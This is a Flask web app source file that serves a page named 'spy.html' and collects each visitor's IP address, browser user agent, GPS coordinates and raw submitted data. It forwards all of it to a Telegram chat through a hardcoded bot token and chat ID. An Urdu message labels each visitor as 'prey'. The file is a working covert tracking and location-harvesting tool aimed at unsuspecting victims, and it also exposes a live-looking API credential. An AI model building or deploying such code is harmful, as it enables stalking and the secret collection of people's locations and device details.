from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# ====== Telegram Configuration ======
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"  # ← اپنی چیٹ آئی ڈی یہاں لگائیں

# ====== HTML Route ======
@app.route('/')
def index():
    return render_template("spy.html")

# ====== Data Receiver ======
@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()  # JSON body
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        latitude = data.get("latitude", "❌")
        longitude = data.get("longitude", "❌")

        location_link = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude != "❌" else "Location not shared"

        message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: {location_link}
🧠 Raw Data: {data}
        """

        # Telegram Message Send
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message}
        requests.post(telegram_url, data=payload)

        return "Data received", 200

    except Exception as e:
        return f"Error: {e}", 500

# ====== Run App ======
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
